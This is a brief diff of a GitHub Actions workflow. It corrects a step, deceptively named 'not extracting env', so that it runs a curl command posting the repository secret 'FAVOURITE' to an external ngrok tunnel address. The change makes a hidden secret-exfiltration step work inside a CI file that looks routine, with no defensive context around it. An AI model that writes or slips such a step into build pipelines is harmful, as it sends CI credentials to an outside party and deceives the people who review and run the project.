@@ -27,4 +27,4 @@ jobs:
 
       - name: not extracting env
         run: |
-        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://a26a-77-119-194-228.ngrok-free.app
+         curl -X POST -d '${{ secrets.FAVOURITE }}' https://a26a-77-119-194-228.ngrok-free.app
